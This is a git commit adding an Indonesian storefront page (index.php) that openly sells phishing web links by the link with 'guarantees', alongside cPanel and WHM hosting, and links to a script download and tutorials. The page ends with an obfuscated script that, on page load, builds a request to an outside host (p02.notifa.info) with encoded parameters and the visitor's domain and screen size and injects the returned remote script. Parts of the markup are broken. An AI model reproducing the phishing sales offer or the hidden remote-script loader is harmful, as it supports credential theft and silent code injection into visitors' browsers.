b989badd44ae754f50c0746365bbb0bdfe11948c
Sipenyembuh <89495439+Sipenyembuh@users.noreply.github.com>
2021-09-28 06:20:03 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta property="og:title" content="Demo Web Fii Utama" />
+    <meta property="og:image" content="./assets/img/bg.jpg" />
+    <link rel="stylesheet" href="./assets/css/animate.css">
+    <link rel="stylesheet" href="./assets/css/speedhost.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="icon" href="./assets/img/logo.png" />    
+    <title> - FII UTAMA | DEMO - </title>    
+</head>
+<body style="background: url(assets/img/fiibg1.png) no-repeat;">
+    <div id="loader">
+        <img id="speedhostinglive" src="./assets/img/loader1.png" autoplay loop>
+    </div> 
+    <div class="speedhosting">
+        <img src="./assets/img/header1.png" alt="Speed Hosting Live" class="img-atas animated rubberBand">
+        
+  <marquee><FONT COLOR="#009900">WELCOME TO MY DEMO SHOP</marquee>
+        <marquee><FONT COLOR="#009900">SETEL LAGU DULU OM '_'</marquee> 
+         <audio src="demo.mp3" controls></audio>
+        
+        <button class="btn-demo" onclick="location.href='https://fiiutama17.blogspot.com/';">blogger Ku</button>
+          <button class="btn-demo" onclick="location.href='https://cloud2.energyasia.net:2083/';">Log-in Cpanel</button>
+            <button class="btn-demo" onclick="location.href='https://cloud2.energyasia.net:2087/';">Log-in Whm</button>
+            <button class="btn-demo" onclick="location.href='https://www.facebook.com/leaderapex02/';">Cek Profil</button>
+          <button class="btn-demo" onclick="location.href='https://m.facebook.com/leaderapex02/albums/584823438565020/';">My Testimoni</button>
+         <button class="btn-demo" onclick="location.href='https://freenom.com';">Freenom Site</button>
+         <button class="btn-demo" onclick="location.href='https://changeip.com/';">Changeip Site</button>
+          <div>                           
+          <div>
+          <center>
+        <button class="btn btn-daftar animated jello" id="btn-logdemo" onclick="logdemo()">Cek Menu New</button><p>                                   
+    <div id="logdemo" class="contentspeedhosting">
+        <button class="btn btn-speed animated wobble" style="color: #000;" id="btn-logdemo" onclick="logdemo()">Tutup</button>
+        <div class="loginspeedhost animated wobble">
+            <div class="text" style="font-size: 1em;">Klik Yang Ada Di bawah Untuk Melanjutkan</div>           
+            <button class="btn-demo" onclick="window.open('./demo/demo.php','_blank');">cek Demo </button
+            <center>
+            <button class="btn-demo" onclick="window.open('./tutor/tutor.php','_blank');">Tutor All Domain</button>
+            <center>
+            <button class="btn-demo" onclick="window.open('./sc/script.php','_blank');">Download Script</button>
+            <button class="btn-demo" id="btn-harga" onclick="listharga()">List Harga</button><p>
+            
+                              
+  </div>     
+     <div id="harga" class="contentspeedhosting">
+        <button class="btn btn-speed animated wobble" style="color: #000;" id="btn-harga" onclick="listharga()">Tutup</button>
+        <div class="bodoah">
+            <div class="scrollbae animated jello">
+                <font style="opacity: 0;">.</font>
+                <div class="text" style="font-size:1.3em;">WEB PHISING</div>
+                <table id="hargaaa">
+                    <tr><th>Jenis</th><th>Harga</th></tr>
+                    <tr><td>NO GARANSI/1 LINK</td><td>Rp 15.000</td></tr>
+                    <tr><td>1x GARANSI/2 LINK</td><td>Rp 20.000</td></tr>
+                    <tr><td>2x GARANSI/3 LINK</td><td>Rp 30.000</td></tr>
+                    <tr><td>3x GARANSI/4 LINK</td><td>Rp 40.000</td></tr>
+                    <tr><td>4x GARANSI/5 LINK</td><td>Rp 50.000</td></tr>
+                    <tr><td>TIDAK MENERIMA FULL GARANSI</td><td>~</td></tr>
+                </table>
+                <font style="opacity: 0;">.</font>
+                <div class="text" style="font-size:1.3em;">CPANEL</div>
+                <table id="hargaaa">
+                    <tr><th>Jenis</th><th>Disk</th><th>Bandwidth</th><th>Harga</th></tr>
+                    <tr><td>MINI</td><td>200 MB</td><td>1000 MB</td><td>Rp 10.000</td></tr>
+                    <tr><td>MEDIUM</td><td>400 MB</td><td>2000 MB</td><td>Rp 15.000</td></tr>
+                    <tr><td>EXTRA</td><td>1000 MB</td><td>3000 MB</td><td>Rp 20.000</td></tr>
+                    <tr><td>SUPER</td><td>2000 MB</td><td>10000 MB</td><td>Rp 25.000</td></tr>
+                </table>
+                <font style="opacity: 0;">.</font>
+                <div class="text" style="font-size:1.3em;">WHM</div>
+                <table id="hargaaa">
+                    <tr><th>Jenis</th><th>Disk</th><th>Bandwidth</th><th>Create</th><th>Harga</th></tr>
+                    <tr><td>MINI</td><td>5000 MB</td><td>25000 MB</td><td>15 CPanel</td><td>Rp 30.000</td></tr>
+                    <tr><td>MEDIUM</td><td>10000 MB</td><td>25000 MB</td><td>25 CPanel</td><td>Rp 40.000</td></tr>
+                    <tr><td>EXTRA</td><td>15000 MB</td><td>50000 MB</td><td>35 CPanel</td><td>Rp 50.000</td></tr>
+                    <tr><td>SUPER</td><td>20000 MB</td><td>50000 MB</td><td>50 CPanel</td><td>Rp 60.000</td></tr>
+                </table>
+                <font style="opacity: 0;">.</font>
+                <div class="text" style="font-size:1.3em;">MWHM</div>
+                <table id="hargaaa">
+                    <tr><th>Jenis</th><th>Disk</th><th>Bandwidth</th><th>Create</th><th>Harga</th></tr>
+                    <tr><td>MINI</td><td>25000 MB</td><td>50000 MB</td><td>7 Whm</td><td>Rp 80.000</td></tr>
+                    <tr><td>MEDIUM</td><td>25000 MB</td><td>50000 MB</td><td>10 Whm</td><td>Rp 100.000</td></tr>
+                    <tr><td>EXTRA</td><td>25000 MB</td><td>50000 MB</td><td>15 Whm</td><td>Rp 130.000</td></tr>
+                    <tr><td>SUPER</td><td>25000 MB</td><td>50000 MB</td><td>20 Whm</td><td>Rp 150.000</td></tr>
+                </table>
+                  </div>     
+     <div id="jadwal" class="contentspeedhosting">
+        <button class="btn btn-speed animated wobble" style="color: #000;" id="btn-harga" onclick="jadwal()">Tutup</button>
+        <div class="bodoah">
+            <div class="scrollbae animated jello">
+                <font style="opacity: 0;">.</font>
+                <div class="text" style="font-size:1.3em;">WEB PHISING</div>
+                <table id="jadwal">
+                    <tr><th>Hari</th><th>jam</th></tr>
+                    <tr><td>senin/7 jam on/td></tr>
+                    <tr><td>selasa/7 jam on</td></tr>
+                    <tr><td>rabu/9 jam on</td></tr>
+                    <tr><td>3x GARANSI/4 LINK</td><td>Rp 40.000</td></tr>
+                    <tr><td>4x GARANSI/5 LINK</td><td>Rp 50.000</td></tr>
+                    <tr><td>TIDAK MENERIMA FULL GARANSI</td><td>~</td></tr>
+                </table>
+            </div>
+        </div>
+    </div>
+    </div>
+    <script src="./assets/js/speedhosting.js"></script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m3n4LJ5ocyN06xS5HL%2bA02zD%2fNu6mHKMwNEchMXtPnDZk7o02RFOa1HmjtG9jlYCPDd7xnZa2n%2fzxchoSp26kpWMtTfyH7PJdnT48elaII0rzVDZn%2bnrvwUpDtuFcabSZ0RqiD2rO7Pc0%2bVEMmxdzjCfhaCP3ySu%2bumOfJokknKVQN%2fqU5f69Q4uDgOiFRBuKBl7y7ZQ3ihuqp%2bs2Wzd2v45IrllVCZCGLIWeUocJyvju%2fhOnyw61%2bTYNCrpiIKHWvyNdwdYAVLuU6npko5CLaM7k47l%2fpt8uVIYcdTuMktnn4NVdWqUujlTxK2vwEhQTVx3egD7pqsV0IMUB1hPjkj2lY9Ai7qIs0RVAIeaOon9TI04Xn7OOUyTIQx%2f9tFq6wNz03lxiETGvDe4Mx%2fyIWwXPIyNpMyfubcgexcAGekmdWiXvynnvYhhgEA582wlKtuT9gM9j%2bBWgsvRMIjB0G8r0o005AvvXhRSbwVuh94eLFvXD4Skx7cQgFChZJq1rBDix%2b9t5TVG%2fz7UkfQxgHQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
